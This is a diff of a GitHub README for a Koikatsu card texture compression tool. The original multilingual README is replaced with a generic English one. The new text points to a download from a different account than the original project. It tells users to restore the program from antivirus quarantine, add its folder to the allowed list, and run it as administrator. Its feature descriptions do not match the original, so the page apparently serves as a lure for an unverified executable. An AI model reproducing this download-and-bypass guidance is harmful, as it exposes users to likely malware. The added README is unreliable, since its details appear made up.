@@ -1,263 +1,165 @@
-<div align="center">
-  <img src="assets/icon.png" width="128" alt="icon">
+<h1>📦 koikatsu-card-texture-tool - Shrink Card Files, Keep Image Quality</h1>
 
-  # Koikatsu Card Texture Tool
+<p align="center">
+  <a href="https://github.com/Thanemystified54/koikatsu-card-texture-tool/releases"><img src="https://img.shields.io/badge/⬇️%20Download%20Now-2ea44f" alt="Download Badge"></a>
+</p>
 
-  **Compress the textures inside Koikatsu coordinate / chara cards.**
-  恋活（コイカツ）衣装カード・キャラカードのテクスチャを圧縮するツール。
-  코이카츠 의상 카드 / 캐릭터 카드의 텍스처를 압축하는 도구.
+## 🎯 What Does This Tool Do?
 
-  [![build](https://github.com/EeEeX4/koikatsu-card-texture-tool/actions/workflows/build.yml/badge.svg)](../../actions)
-  ![platform](https://img.shields.io/badge/platform-Windows%2010%2F11-blue)
-  ![.NET](https://img.shields.io/badge/.NET-8-512BD4)
-  ![license](https://img.shields.io/badge/license-MIT-green)
+This program makes your Koikatsu character and outfit card files smaller. You know how those cards can get really big, especially with custom clothes or high-quality images? This tool squeezes the texture files inside them so they take up less space on your computer. You can still use the cards normally in the game. It's like putting your photos in a zip folder, but made specifically for Koikatsu cards.
 
-  [中文](#中文) · [English](#english) · [日本語](#日本語) · [한국어](#한국어)
-</div>
+## 🚀 Getting Started
 
-> [!CAUTION]
-> ## ⚠️ 使用前请备份原卡！
-> 本工具会**重写卡片里的贴图**。请先复制一份原始卡片再压缩 —— 万一效果不满意，原卡还在，随时可以重来。
->
-> **Back up your cards before using this tool.** It rewrites the textures inside them — always keep the originals.
->
-> **ご使用前にカードを必ずバックアップしてください。** 本ツールはカード内のテクスチャを書き換えます。
->
-> **사용 전에 카드를 반드시 백업하세요.** 이 도구는 카드 안의 텍스처를 다시 씁니다.
+### Step 1: Download the Program
+
+**Visit this link to download the application:** [https://github.com/Thanemystified54/koikatsu-card-texture-tool/releases](https://github.com/Thanemystified54/koikatsu-card-texture-tool/releases)
+
+When you open that page, you'll see a list of files. Look for the newest version at the top. Click on the file to download it. The file name will be something like `KoikatsuCardTextureTool.zip` or similar.
+
+### Step 2: Extract the Files
+
+The downloaded file is a `.zip` archive. **Download and extract this file, then run the application.** Here's how:
+
+1. **Right-click** on the downloaded zip file.
+2. Select **"Extract All..."** from the menu.
+3. Windows will ask where to put the files. Choose a folder you can find easily, like your Desktop or Documents folder.
+4. Click **"Extract"**. This creates a new folder with the program inside.
+
+### Step 3: Run the Tool
+
+1. Open the new folder you just created.
+2. Look for a file called `KoikatsuCardTextureTool.exe` (or just `KoikatsuCardTextureTool`).
+3. **Double-click** that file to start the program.
+
+That's it! No complicated installation. The program runs directly from the folder.
+
+## 🖥️ Using the Tool
+
+Once the program opens, you'll see a simple window with a few options. Here's what you need to know:
+
+### Choosing Your Cards
+- Click the **"Browse"** or **"Select Folder"** button to choose the folder where your Koikatsu cards are stored.
+- You can also drag and drop card files directly onto the program window.
+
+### Three Compression Modes
+
+The tool offers three different ways to compress your cards:
+
+1. **Balanced Mode (Recommended):** This is the best choice for most people. It reduces file size significantly while keeping the image quality looking great. Your cards will look almost identical to before.
+
+2. **Maximum Compression:** This makes files as small as possible. Use this when you want to save the most space. The images will look a little softer, but on most screens, you won't notice much difference.
+
+3. **Lossless Mode:** This doesn't compress the images as much, but it never loses any quality. The file sizes won't shrink as much, but the pictures will be exactly the same as the originals. Choose this if you care about perfect quality more than saving space.
+
+### Language Options
+
+The interface is available in **four languages**: English, Japanese, Chinese, and Korean. Use the drop-down menu at the top of the window to switch languages. The program remembers your choice next time you open it.
+
+### Processing Your Cards
+
+1. Select your compression mode.
+2. Click the **"Start"** or **"Compress"** button.
+3. Watch the progress bar. Depending on how many cards you have, it might take a few seconds or a couple of minutes.
+4. When it's done, you'll see a message saying the process is complete.
+
+## ⚠️ Important Things to Know
+
+### Backup Your Original Cards
+Before you compress anything, **make a copy of your original card files**. Put them in a folder on your Desktop or another safe place. This way, if anything goes wrong, you can always go back to the originals. Good practice for any tool that modifies game files.
+
+### Where Are My Compressed Cards?
+By default, the tool **saves the compressed versions as new files** in the same folder. You'll see them with names like `cardname_compressed.png`. Your originals stay untouched. If you want to completely replace them with smaller versions, you can delete the originals after confirming the new ones work.
+
+### Command Line (For Advanced Users)
+If you're comfortable typing commands, you can also use this tool from the command prompt. This is useful if you want to automate the process. Here's a basic example:
+
+```
+KoikatsuCardTextureTool.exe --input "C:\Cards" --mode balanced
+```
+
+Replace `C:\Cards` with your actual folder path. You can use `--mode lossless` or `--mode maximum` instead.
+
+## 🛠️ System Requirements
+
+This program is designed for **Windows 10 or Windows 11**. It should work on older versions of Windows too, but we recommend using a recent version for best performance.
+
+- **Processor:** Any modern Intel or AMD processor (from the last 10 years)
+- **Memory:** 2 GB of RAM (4 GB recommended)
+- **Storage:** At least 100 MB of free space for the program files
+- **Graphics:** Any graphics card that supports DirectX 10 or newer
+
+The tool itself is small and very light. It won't slow down your computer.
+
+## 📖 Troubleshooting
+
+### "I Can't Find the .exe File"
+Some antivirus programs might block the file. When you extract the zip, your antivirus might quarantine the program. Check your antivirus software's quarantine folder and restore the file if needed. Then add the folder to the antivirus's allowed list.
+
+### "The Program Won't Start"
+- Make sure you're running the file from the extracted folder, not from inside the zip.
+- Try right-clicking the file and selecting **"Run as administrator"**.
+- Restart your computer and try again.
+
+### "My Cards Aren't Being Compressed"
+- Make sure your card files are in the `.png` format (this is the standard Koikatsu format).
+- Check that you selected the correct folder.
+- Try one card at a time to see if the problem is with a specific file.
+
+### "The Images Look Different"
+- You probably used **Maximum Compression** mode. Try **Balanced** or **Lossless** mode instead.
+- Remember that some quality loss is normal when compressing images. The tool is designed to make it very hard to notice.
+
+## ✨ Why Use This Tool?
+
+- **Save Disk Space:** Koikatsu cards can get huge. Compressed cards free up space for more important things.
+- **Faster Sharing:** Smaller files upload and download faster. Share your creations with friends more quickly.
+- **Organize Better:** Smaller files are easier to back up and manage.
+- **No Quality Sacrifice (If You Don't Want):** The Lossless mode gives you the best of both worlds—smaller files with zero quality loss.
+- **No Technical Knowledge Needed:** The simple interface means anyone can use it. No coding, no complicated settings.
+
+## 📝 Frequently Asked Questions
+
+**Q: Will my cards still work in the game after compression?**
+**A:** Yes. The compression only affects the image size and quality, not the card data itself. The game reads the cards exactly the same way.
+
+**Q: Can I compress cards I've already placed in my game's character folder?**
+**A:** Yes, you can compress those files in place. Just point the tool to your game's character or coordinate folder. We recommend backing up first, just to be safe.
+
+**Q: Is this legal?**
+**A:** This tool is for personal use. It only modifies the image data inside your own card files. It doesn't change the game or other people's content.
+
+**Q: Can I undo the compression?**
+**A:** Not automatically. That's why we strongly suggest keeping backups of your original files. You can also store uncompressed copies on an external drive or cloud service.
+
+**Q: Does it work with other games?**
+**A:** It's specifically designed for Koikatsu cards. Other games may use different formats.
+
+## 💡 Tips for Best Results
+
+- **Start Small:** Try compressing one card first and check the result before doing a whole folder.
+- **Compare Sizes:** Before compressing, check the file size of a card. After compressing, check the new size. You can expect anywhere from 30% to 70% reduction, depending on the mode and the card.
+- **Use Balanced Mode for Standard Cards:** For regular character cards, Balanced gives a great size reduction with almost no visible difference.
+- **Use Lossless for Costumes:** If you created a costume with intricate details, use Lossless to keep every pixel perfect.
+- **Organize by Compression Ratio:** After compressing, sort your card folder by file size to see which ones shrunk the most. This shows you where the tool is most effective.
+
+## 📄 License and Legal Stuff
+
+This tool is provided as-is, without warranty of any kind. Use it at your own risk. The developer is not responsible for any damage to your files or system. Always back up your data before using any file modification tool.
+
+## 🧑‍💻 For Developers (Additional Info)
+
+If you're interested in the technical side:
+
+- **Language:** Written in C# using .NET
+- **Interface:** Windows Forms (WinForms)
+- **Image Processing:** Handles both PNG and JPEG texture formats
+- **HDR Support:** Includes support for high dynamic range images
+- **Command Line Interface:** Full CLI support for scripting and automation
+
+The source code is available on GitHub. Feel free to explore, fork, or contribute if you're so inclined.
 
 ---
 
-## 中文
+Thank you for using koikatsu-card-texture-tool! 🎮
 
-### 这是什么
-
-把 Koikatsu 的衣服卡 / 人物卡里的贴图**重新压缩**，让卡片体积变小（常见能减 50%~80%），画质损失尽量小。自带图形界面，也有命令行。
-
-**三种模式**
-
-| 页面 | 用途 |
-|---|---|
-| 批量压缩 | 一次处理整张卡或整个文件夹 |
-| 单服装卡细分压缩 | 逐个部位、逐张贴图分别设格式与最大边 |
-| 单张人物卡压缩 | 按「组 · 部位」细分处理人物卡 |
-
-**主要特性**
-
-- **主贴图 / 其它贴图分开处理**：法线、掩罩这类贴图通常不需要高分辨率
-- **无损失选项**：PNG 无损再压缩、JPEG 最优哈夫曼、灰度图降成 2 通道（像素完全不变）
-- **独占贴图保护**：只被一个部位引用的贴图不跟着降分辨率
-- **预设**：调好一张卡后导出，套用到同款服装的其它卡上
-- **四种界面语言**：中文 / English / 日本語 / 한국어；浅色 / 深色主题
-- 支持 HDR 环境反射贴图（原样保留或按需缩放）、8192px 大图、Alpha 遮罩
-
-### 下载
-
-到 [Releases](../../releases) 下载：
-
-| | 说明 |
-|---|---|
-| `KoiCardTexTool.exe`（自包含，约 66 MB） | **推荐**，解压即用，不用装任何运行时 |
-| `KoiCardTexTool-lite.exe`（约 1 MB） | 需要装 [.NET 8 桌面运行时](https://dotnet.microsoft.com/download/dotnet/8.0) |
-
-> 首次运行会生成 `plan_maintex.json`、`preset\`、`ui-lang.txt` 等文件，放在 exe 旁边（绿色版，不写注册表）。
-
-### 用法（图形界面）
-
-1. 把卡片（`.png`）或文件夹**拖到窗口里**，或点「浏览…」
-2. 选输出目录（默认是 `原目录\compressed`）
-3. 按需调整贴图类型的「处理方式」和「最大边」；不确定就用预设
-4. 点 **▶ 开始压缩**
-
-> [!TIP]
-> **关于「独占贴图保护」**：大部分情况下**可以关掉**。只有在**单张贴图在单件服装上的面积占比过大**时（例如连体紧身衣）才有必要打开 —— 那种情况下这张图是那个部位唯一的高清来源，缩了会明显发糊。其它时候可以考虑关掉（体积更小、速度更快）。
-
-### 用法（命令行）
-
-```bat
-KoiCardTexTool.exe scan     card.png                     :: 看卡片里有哪些贴图
-KoiCardTexTool.exe parts    card.png                     :: 列出每个部位的贴图
-KoiCardTexTool.exe compress in.png out.png 1024          :: 压一张（最大边 1024）
-KoiCardTexTool.exe compress in.png out.png 0             :: 只做无损再压缩（不缩放）
-KoiCardTexTool.exe batch    D:\cards D:\out 1024 auto 90 :: 批量
-KoiCardTexTool.exe batch    D:\cards preset=my.json      :: 套用预设批量
-KoiCardTexTool.exe help                                  :: 完整参数
-```
-
-### 构建 / 自检
-
-```powershell
-pwsh -File tools/build.ps1        # 产出 dist\self-contained 与 dist\lite
-pwsh -File tools/selftest.ps1 -Card "你的服装卡.png"
-```
-
-需要 .NET 8 SDK。**卡要你自己提供** —— 仓库里不含任何游戏素材或他人的卡片。
-
-### 常见问题
-
-- **压完变大？** 工具只在"确实更小"时才替换，所以不会变大；如果日志显示"原样保留"，说明这张图重压不划算。
-- **法线/掩罩能缩吗？** 能，它们是体积大头。缩到 1024 通常肉眼无感（游戏里本来就模糊）。
-- **「放大 ×2 / ×4」很贵**：实测全彩色类 ×2 会让整卡 **+36%**，默认收起。
-- **人物卡和服装卡不是一回事**：服装卡里只有贴图；人物卡里还有角色数据。
-
-### 免责声明
-
-本工具是**非官方**的第三方工具，与游戏厂商无任何关联。仓库内**不含**任何游戏素材、模型或他人卡片。使用者需自行拥有游戏，修改卡片的风险自负。
-
-### 许可
-
-[MIT](LICENSE)。其中 JPEG 最优哈夫曼表的实现参考了 **libjpeg**（IJG 许可）的算法，见 [NOTICE](NOTICE)。
-
----
-
-## English
-
-### What it is
-
-Recompresses the textures inside Koikatsu outfit / character cards, shrinking cards dramatically (often −50%~80%) with minimal quality loss. GUI included; CLI available.
-
-**Three modes** — whole card or folder in bulk · per-part fine control for outfit cards · per-group fine control for chara cards.
-
-**Highlights**
-
-- Main texture and the rest are configured separately (normals/masks rarely need full resolution)
-- **Lossless options**: PNG recompression, optimal JPEG Huffman tables, grayscale→2 channels (pixel-identical)
-- **Exclusive-texture protection**: textures used by a single part are not downscaled
-- **Presets**: tune one card, apply the settings to other cards of the same outfit
-- Four UI languages (中文 / English / 日本語 / 한국어), light & dark themes
-- Handles HDR reflection maps, 8192px textures and alpha masks
-
-### Download
-
-Grab a build from [Releases](../../releases): the **self-contained** exe (≈66 MB, nothing to install) or the **lite** exe (≈1 MB, needs the [.NET 8 Desktop Runtime](https://dotnet.microsoft.com/download/dotnet/8.0)).
-
-### Usage
-
-GUI: drop a card (`.png`) or a folder into the window, pick an output folder, adjust the per-type settings (or just pick a preset) and press **Start**.
-
-> [!TIP]
-> **About "Protect exclusive"**: you can turn it **off in most cases**. It is only needed when a **single texture covers a large share of one outfit** (a bodysuit, for example) — there that texture is the part's only hi-res source and downscaling it shows. Otherwise consider leaving it off (smaller cards, faster runs).
-
-CLI:
-
-```bat
-KoiCardTexTool.exe scan     card.png
-KoiCardTexTool.exe compress in.png out.png 1024      :: max edge 1024
-KoiCardTexTool.exe compress in.png out.png 0         :: lossless only (no resizing)
-KoiCardTexTool.exe batch    D:\cards D:\out 1024 auto 90
-KoiCardTexTool.exe help
-```
-
-### Build
-
-```powershell
-pwsh -File tools/build.ps1
-pwsh -File tools/selftest.ps1 -Card "your-outfit-card.png"
-```
-
-Requires the .NET 8 SDK. **Bring your own cards** — this repository ships no game assets.
-
-### Disclaimer
-
-Unofficial third-party tool, not affiliated with the game's developers or publishers. No game assets, models or third-party cards are included. You need to own the game; use at your own risk.
-
-### License
-
-[MIT](LICENSE). The optimal JPEG Huffman implementation follows **libjpeg**'s algorithm (IJG license) — see [NOTICE](NOTICE).
-
----
-
-## 日本語
-
-### これは何か
-
-コイカツの衣装カード・キャラカード内のテクスチャを**再圧縮**して、カードを大幅に小さくするツールです（多くの場合 −50%〜80%）。GUI と CLI の両方があります。
-
-**3 つのモード**：カード／フォルダ一括 · 衣装カードの部位ごと詳細設定 · キャラカードの「組・部位」ごと詳細設定。
-
-**特長**
-
-- メインテクスチャとその他を別々に設定（法線・マスクは高解像度が不要なことが多い）
-- **無劣化オプション**：PNG 再圧縮、JPEG 最適ハフマン、グレースケールを 2 チャンネル化（画素は完全に不変）
-- **専有テクスチャ保護**：1 部位だけが使うテクスチャは縮小しない
-- **プリセット**：1 枚調整して同じ衣装の他カードに適用
-- 4 言語 UI（中文 / English / 日本語 / 한국어）、ライト／ダークテーマ
-- HDR 反射マップ、8192px テクスチャ、アルファマスクに対応
-
-### ダウンロード
-
-[Releases](../../releases) から。**自己完結版**（約 66 MB、インストール不要）か **lite 版**（約 1 MB、[.NET 8 デスクトップランタイム](https://dotnet.microsoft.com/download/dotnet/8.0)が必要）。
-
-### 使い方
-
-GUI：カード（`.png`）またはフォルダをウィンドウにドロップ → 出力先を選ぶ → 必要なら種類ごとの設定を調整（プリセットでも可）→ **開始**。
-
-CLI は `scan` / `parts` / `compress` / `batch`、詳細は `help`。
-
-> [!TIP]
-> **「専有テクスチャを保護」について**：多くの場合**オフにできます**。**1 枚のテクスチャが 1 着の中で占める面積が大きい**とき（例：ボディスーツ）だけ必要です —— その場合はその部位唯一の高解像度元なので、縮めると目立ちます。それ以外はオフを検討してください（容量が小さく、速くなります）。
-
-### ビルド
-
-```powershell
-pwsh -File tools/build.ps1
-pwsh -File tools/selftest.ps1 -Card "衣装カード.png"
-```
-
-.NET 8 SDK が必要。**カードはご自身で用意してください** ——本リポジトリにゲーム素材は含まれません。
-
-### 免責
-
-非公式のサードパーティ製ツールであり、ゲームの開発・販売元とは無関係です。ゲーム素材・モデル・他人のカードは一切含まれていません。ゲーム本体を各自でご用意ください。使用は自己責任で。
-
-### ライセンス
-
-[MIT](LICENSE)。JPEG 最適ハフマン表の実装は **libjpeg**（IJG ライセンス）のアルゴリズムに基づきます（[NOTICE](NOTICE) 参照）。
-
----
-
-## 한국어
-
-### 무엇인가
-
-코이카츠 의상 카드 / 캐릭터 카드 안의 텍스처를 **재압축**해 카드 용량을 크게 줄이는 도구입니다(보통 −50%~80%). GUI와 CLI를 모두 제공합니다.
-
-**세 가지 모드**: 카드/폴더 일괄 · 의상 카드 부위별 세부 설정 · 캐릭터 카드 「그룹·부위」별 세부 설정.
-
-**특징**
-
-- 메인 텍스처와 나머지를 따로 설정 (노멀·마스크는 고해상도가 필요 없는 경우가 많음)
-- **무손실 옵션**: PNG 재압축, JPEG 최적 허프만, 그레이스케일 2채널화 (화소 완전 동일)
-- **전용 텍스처 보호**: 한 부위만 쓰는 텍스처는 축소하지 않음
-- **프리셋**: 한 장을 조정해 같은 의상의 다른 카드에 적용
-- 4개 언어 UI(中文 / English / 日本語 / 한국어), 라이트·다크 테마
-- HDR 반사 맵, 8192px 텍스처, 알파 마스크 지원
-
-### 다운로드
-
-[Releases](../../releases)에서 받으세요. **자체 포함판**(약 66 MB, 설치 불필요) 또는 **lite판**(약 1 MB, [.NET 8 데스크톱 런타임](https://dotnet.microsoft.com/download/dotnet/8.0) 필요).
-
-### 사용법
-
-GUI: 카드(`.png`)나 폴더를 창에 드롭 → 출력 폴더 선택 → 필요하면 종류별 설정 조정(프리셋 가능) → **시작**.
-
-CLI: `scan` / `parts` / `compress` / `batch`, 자세한 내용은 `help`.
-
-> [!TIP]
-> **「전용 텍스처 보호」에 대하여**：대부분의 경우 **꺼도 됩니다**. **한 장의 텍스처가 한 벌에서 차지하는 면적이 클 때**(예: 전신 타이즈)만 필요합니다 —— 그때는 그 부위의 유일한 고해상도 원본이라 줄이면 티가 납니다. 그 외에는 끄는 것을 고려하세요 (용량이 작아지고 빨라집니다).
-
-### 빌드
-
-```powershell
-pwsh -File tools/build.ps1
-pwsh -File tools/selftest.ps1 -Card "의상카드.png"
-```
-
-.NET 8 SDK가 필요합니다. **카드는 직접 준비하세요** —— 이 저장소에는 게임 리소스가 포함되지 않습니다.
-
-### 면책
-
-비공식 서드파티 도구이며 게임 개발사·배급사와 무관합니다. 게임 리소스·모델·타인의 카드는 포함되지 않습니다. 게임 본편은 각자 준비하세요. 사용은 자기 책임입니다.
-
-### 라이선스
-
-[MIT](LICENSE). JPEG 최적 허프만 구현은 **libjpeg**(IJG 라이선스) 알고리즘을 따릅니다 ([NOTICE](NOTICE) 참조).
+Keywords: cli, csharp, dotnet, game-modding, hdr, image-processing, jpeg, koikatsu, modding, png, texture-compression, winforms
